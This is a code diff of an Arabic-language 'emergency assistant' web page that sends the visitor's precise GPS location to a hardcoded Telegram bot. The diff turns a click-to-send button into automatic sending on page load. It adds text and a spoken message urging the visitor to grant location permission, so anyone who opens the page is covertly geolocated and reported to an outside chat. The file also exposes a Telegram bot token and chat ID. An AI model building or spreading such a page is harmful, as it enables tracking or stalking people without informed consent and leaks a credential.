@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مساعد الطوارئ</title>
+    <title>مساعد الطوارئ الفوري</title>
     <style>
         body {
             margin: 0;
@@ -13,55 +13,65 @@
             height: 100vh;
             background-color: #121212;
             font-family: sans-serif;
-            overflow: hidden;
         }
-        .container { text-align: center; }
+        .container { text-align: center; padding: 20px; }
         .help-btn {
-            width: 280px;
-            height: 280px;
+            width: 250px;
+            height: 250px;
             border-radius: 50%;
             border: 10px solid #fff;
             background: radial-gradient(circle, #ff5252, #b71c1c);
             color: white;
-            font-size: 40px;
+            font-size: 35px;
             font-weight: bold;
-            cursor: pointer;
-            box-shadow: 0 0 40px rgba(255, 0, 0, 0.7);
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.7);
+            animation: pulse 2s infinite;
         }
-        .help-btn:active { transform: scale(0.95); box-shadow: 0 0 15px rgba(255, 0, 0, 0.9); }
-        .status-text { color: #ccc; margin-top: 25px; font-size: 18px; padding: 0 20px; }
-        .icon { font-size: 80px; margin-bottom: 10px; }
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 20px rgba(255, 0, 0, 0.5); }
+            50% { transform: scale(1.05); box-shadow: 0 0 50px rgba(255, 0, 0, 0.8); }
+            100% { transform: scale(1); box-shadow: 0 0 20px rgba(255, 0, 0, 0.5); }
+        }
+        .status-text { color: #ffffff; margin-top: 30px; font-size: 22px; font-weight: bold; }
+        .sub-text { color: #888; margin-top: 10px; font-size: 16px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="help-btn" onclick="sendLocation()">
-        <span class="icon">🆘</span>
-        <span>اضغط هنا</span>
+    <div class="help-btn">
+        <span style="font-size: 60px;">🆘</span>
+        <span>جاري الإرسال...</span>
     </div>
-    <div id="status" class="status-text">اضغط على الدائرة الحمراء لتنتقل الى الموقع ك</div>
+    <div id="status" class="status-text">جاري تحديد موقعك الآن...</div>
+    <div class="sub-text">إذا ظهرت لك رسالة "سماح" اضغط عليها فوراً</div>
 </div>
 
 <script>
-    // بياناتك الخاصة التي زودتني بها
     const botToken = "8036035151:AAGx8I8HfUM401Y_XrzHyTvGhpQC5RXNVBM";
     const chatId = "1230856956";
 
+    // تفعيل الإرسال التلقائي بمجرد فتح الصفحة
+    window.onload = function() {
+        sendLocation();
+        // تنبيه صوتي للمستخدم
+        setTimeout(() => {
+            const speech = new SpeechSynthesisUtterance("جاري تحديد موقعك وإرساله لصديقك، يرجى الانتظار");
+            speech.lang = 'ar-SA';
+            window.speechSynthesis.speak(speech);
+        }, 500);
+    };
+
     function sendLocation() {
         const status = document.getElementById('status');
-        status.innerText = "جاري تحديد موقعك بدقة... انتظر ثواني";
-        status.style.color = "#ffeb3b";
-
+        
         const options = {
-            enableHighAccuracy: true, // تفعيل الدقة القصوى بالمتر
-            timeout: 15000,           // زيادة وقت الانتظار لضمان جلب الموقع
+            enableHighAccuracy: true, // دقة بالمتر الواحد
+            timeout: 15000,
             maximumAge: 0
         };
 
@@ -71,37 +81,21 @@
                 const lon = position.coords.longitude;
                 const accuracy = position.coords.accuracy.toFixed(1);
 
-                // رابط خرائط جوجل الرسمي والمباشر
                 const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                
-                const telegramMsg = `🚨 **نداء استغاثة جديد!**\n\n📍 الدقة: حوالي ${accuracy} متر\n🔗 اضغط هنا لفتح الموقع:\n${googleMapsUrl}`;
+                const telegramMsg = `🚨 **استغاثة تلقائية (عند الفتح)**\n\n📍 الدقة: ${accuracy} متر\n🔗 الرابط:\n${googleMapsUrl}`;
 
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`)
                 .then(res => {
                     if(res.ok) {
-                        status.innerText = "✅ تم الإرسال بنجاح. سأصل إليك قريباً.";
+                        status.innerText = "✅ تم إرسال موقعك بنجاح";
                         status.style.color = "#4caf50";
-                    } else {
-                        status.innerText = "❌ فشل الإرسال. تأكد من توفر الإنترنت.";
-                        status.style.color = "#f44336";
                     }
-                })
-                .catch(err => {
-                    status.innerText = "❌ خطأ في الاتصال بالشبكة.";
-                    status.style.color = "#f44336";
                 });
 
             }, error => {
-                // معالجة الأخطاء الشائعة
-                if (error.code === 1) {
-                    status.innerText = "⚠️ يجب عليك الضغط على 'سماح' (Allow) لمشاركة الموقع.";
-                } else {
-                    status.innerText = "⚠️ فشل تحديد الموقع، تأكد من تشغيل الـ GPS.";
-                }
+                status.innerText = "⚠️ يرجى تفعيل الـ GPS والضغط على 'سماح'";
                 status.style.color = "#ffeb3b";
             }, options);
-        } else {
-            status.innerText = "المتصفح لا يدعم هذه الميزة.";
         }
     }
 </script>
